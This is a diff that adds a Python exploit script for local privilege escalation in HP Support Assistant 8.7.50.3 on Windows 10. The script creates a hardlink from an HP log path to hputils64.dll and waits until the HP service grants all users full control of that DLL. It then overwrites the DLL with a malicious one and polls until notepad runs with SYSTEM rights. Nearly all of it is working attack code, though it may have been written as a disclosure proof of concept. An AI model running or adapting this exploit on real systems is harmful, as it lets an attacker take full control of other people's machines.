@@ -1,0 +1,69 @@
+#coding: utf-8
+'''
+working with:
+    + python 2.7
+    + HP Support Assistant: 8.7.50.3
+    + Windows 10 64bit
+Please install necessary NET frameworks if asked when running the exploit
+
+Source:
+    + CreateHardlink.exe: from symboliclink-testing-tools-master (https://github.com/googleprojectzero/symboliclink-testing-tools)
+    + CreateProcess.exe: CreateProcess.cpp
+    + userenv.dll: DllLoadInvader.cpp
+    + invader.exe: invader.cs
+'''
+import subprocess
+import os
+import time
+import ntpath
+import __main__
+startTime = time.time()
+
+mainDir = os.path.dirname(os.path.realpath(__main__.__file__))
+tmpDir = os.getenv('tmp')+'\\HPBatteryCheck'
+
+HPBatteryCheckDir = mainDir+'\\BatteryTest'
+clientExe = tmpDir+'\\BatteryTest.exe'
+createProcess = mainDir+'\\CreateProcess.exe'
+createHardLink = mainDir+'\\CreateHardlink.exe'
+victim = 'C:\\Program Files (x86)\\HP\\Shared\\hputils64.dll'
+hardlink = 'C:\\ProgramData\\Hewlett-Packard\\HP Support Framework\\Logs\\Temp\\HPSA\\hardlink.xml'
+malDll = mainDir+'\\MalDll.dll'
+
+# create a folder name HPBatteryCheck in tmp folder
+if not os.path.exists(tmpDir):
+    os.mkdir(tmpDir)
+
+# copy HPBatteryCheck dir to %tmp%\HPBatteryCheck
+os.system('copy "%s" "%s"' % (HPBatteryCheckDir, tmpDir))
+
+
+# create hardlink
+pTmp = subprocess.Popen([createHardLink, hardlink, victim])
+pTmp.communicate()
+
+# create client
+pCreate = subprocess.Popen([createProcess, '"%s"' % clientExe])
+pCreate.communicate()
+
+# waiting for permissions to be modified
+while(True):
+    pTmp = subprocess.Popen(['C:\\Windows\\System32\\icacls.exe', 'C:\\Program Files (x86)\\HP\\Shared\\hputils64.dll'], stdout=subprocess.PIPE)
+    out, err = pTmp.communicate()
+    if 'BUILTIN\\Users:(F)' in out:
+        print 'Successfully get full permissions on hputils64'
+        break
+    time.sleep(0.1)
+data = open(malDll, 'rb').read()
+open(victim, 'wb').write(data)
+print 'Finished fake hputils64. Wait for notepad with SYSTEM permission'
+while(True):
+    pTmp = subprocess.Popen('tasklist', stdout=subprocess.PIPE)
+    out, err = pTmp.communicate()
+    for line in out.lower().split('\r\n'):
+        if 'services' in line and 'notepad.exe' in line:
+            print 'Notepad run!'
+            elapsedTime = time.time() - startTime
+            print 'Elapsed: %d seconds' % elapsedTime
+            exit(0)
+    print "Waiting"
